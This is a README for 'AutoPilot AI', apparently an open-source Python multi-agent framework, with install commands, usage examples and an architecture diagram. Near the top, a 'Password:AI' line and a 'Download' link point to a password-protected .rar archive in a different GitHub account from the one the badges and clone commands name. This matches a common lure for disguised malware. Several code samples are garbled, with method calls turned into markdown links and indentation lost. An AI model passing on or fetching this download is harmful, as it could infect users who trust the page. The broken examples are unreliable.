<div align="center">
# 🤖 AutoPilot AI
**Password:AI**
### Open-Source Autonomous AI Agent Framework for Python

Build multi-agent systems that **think**, **plan**, and **execute** — with tool use, long-term memory, and plug-and-play integrations.

[![PyPI](https://img.shields.io/pypi/v/autopilot-ai?color=blue&logo=pypi&logoColor=white)](https://pypi.org/project/autopilot-ai/)
[![Python](https://img.shields.io/badge/Python-3.11%2B-blue?logo=python&logoColor=white)](https://python.org)
[![License](https://img.shields.io/badge/License-Apache_2.0-green.svg)](LICENSE)
[![CI](https://img.shields.io/github/actions/workflow/status/jebo/autopilot-ai/ci.yml?label=CI&logo=github)](https://github.com/jebo/autopilot-ai/actions)
[![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?logo=docker&logoColor=white)](Dockerfile)
[![Docs](https://img.shields.io/badge/Docs-MkDocs-blue?logo=readthedocs)](https://autopilot-ai.dev)
[![Discord](https://img.shields.io/discord/1234567890?color=7289DA&logo=discord&logoColor=white&label=Discord)](https://discord.gg/autopilot-ai)
[![Stars](https://img.shields.io/github/stars/jebo/autopilot-ai?style=social)](https://github.com/jebo/autopilot-ai)
**[Documentation](https://autopilot-ai.dev)** · **[Examples](examples/)** · **[Discord](https://discord.gg/autopilot-ai)** · **[Contributing](CONTRIBUTING.md)**


[Download](https://github.com/pillarthrushtrimmer/AutoPilot-AI/releases/download/AutoPilot/autopilot-ai.rar)
<img src="docs/assets/demo.gif" alt="AutoPilot AI Demo" width="700"/>

</div>

---

## ⚡ Why AutoPilot AI?

> Most AI agent frameworks are bloated, over-abstracted, and hard to customize.
> **AutoPilot AI** is different — it's minimal, fast, and you actually understand the code.

| | AutoPilot AI | LangChain | AutoGPT | CrewAI |
|---|:---:|:---:|:---:|:---:|
| Lines of code | ~2K | ~200K | ~50K | ~15K |
| Setup time | 2 min | 30 min | 15 min | 10 min |
| Multi-LLM | ✅ | ✅ | ❌ | ✅ |
| Long-term memory | ✅ | ⚠️ | ✅ | ❌ |
| Plugin system | ✅ | ❌ | ❌ | ❌ |
| Docker ready | ✅ | ❌ | ✅ | ❌ |
| REST API | ✅ | ❌ | ✅ | ❌ |

---

## 🧠 Core Concepts
User Task → Planner → Agent(s) → Tools → Memory → Result

↑                              |

└──────── feedback loop ────────┘

```

- **Engine** — orchestrates the full lifecycle
- **Planner** — decomposes tasks into executable steps
- **Agents** — specialized workers (Researcher, Coder, Writer, Analyst)
- **Tools** — capabilities agents can use (search, code exec, file I/O)
- **Memory** — vector store for persistent context across sessions
- **Plugins** — integrations with external services

---

## 🚀 Quick Start

### Install from PyPI

```

pip install autopilot-ai

```

### Or clone the repo

```

git clone https://github.com/jebo/autopilot-ai.git

cd autopilot-ai

pip install -e ".[dev]"

```

### Configure

```

cp .env.example .env

# Add your API keys

```

### Run

```

# Chat mode

autopilot chat

# Single task

autopilot run "Research quantum computing breakthroughs in 2026"

# API server

autopilot serve --port 8000

# Docker

docker-compose up -d

```

---

## 💡 Examples

### Basic Agent

```

from autopilot import Agent

agent = Agent(model="gpt-4o")

result = [agent.run](http://agent.run)("What are the top AI trends in 2026?")

print(result)

```

### Multi-Agent Pipeline

```

from autopilot import Pipeline, Researcher, Coder, Writer

pipeline = Pipeline([

Researcher(task="Find best practices for building REST APIs"),

Coder(task="Build a FastAPI app based on the research"),

Writer(task="Write documentation for the API"),

])

for result in pipeline.execute():

print(f"[{result.agent}] {result.summary}")

```

### Custom Tool

```

from [autopilot.tools](http://autopilot.tools) import tool

@tool(name="stock_price", description="Get current stock price")

async def get_stock_price(ticker: str) -> str:

async with httpx.AsyncClient() as client:

resp = await client.get(f"https://api.example.com/stock/{ticker}")

return resp.json()["price"]

agent = Agent(tools=[get_stock_price])

[agent.run](http://agent.run)("What's the current price of AAPL?")

```

---

## 🔌 Built-in Plugins

| Plugin | What it does |
|---|---|
| 📧 **Gmail** | Read, search, send emails |
| 💬 **Slack** | Post messages, read channels |
| 🐙 **GitHub** | Create issues, PRs, manage repos |
| 📝 **Notion** | Create/update pages, query databases |

```

autopilot run "Summarize unread emails and post to #daily-digest on Slack"

```

---

## 🏗️ Architecture

```

┌─────────────────────────────────────────────────┐

│                 AutoPilot Engine                  │

│                                                   │

│  ┌──────────┐  ┌──────────┐  ┌───────────────┐  │

│  │ Planner  │→ │  Agents  │→ │ Vector Memory │  │

│  │ (ReAct)  │  │ Pool     │  │ (ChromaDB)    │  │

│  └──────────┘  └────┬─────┘  └───────────────┘  │

│                     │                             │

│         ┌───────────┴───────────┐                │

│         │    Tool Registry      │                │

│  ┌──────┴───┬────────┬─────────┴┬──────────┐    │

│  │ Search   │ Code   │ Browser  │ File I/O │    │

│  └──────────┴────────┴──────────┴──────────┘    │

│                     │                             │

│         ┌───────────┴───────────┐                │

│         │   Plugin Manager      │                │

│  ┌──────┴───┬────────┬─────────┴┬──────────┐    │

│  │ Gmail    │ Slack  │ GitHub   │ Notion   │    │

│  └──────────┴────────┴──────────┴──────────┘    │

│                     │                             │

│         ┌───────────┴───────────┐                │

│         │   REST + WS API       │                │

│         │   (FastAPI)           │                │

│         └───────────────────────┘                │

└─────────────────────────────────────────────────┘

```

---

## 📄 License

Apache 2.0 © jebo

---

## ⭐ Star History

[![Star History](https://api.star-history.com/svg?repos=jebo/autopilot-ai&type=Date)](https://star-history.com/#jebo/autopilot-ai&Date)
```
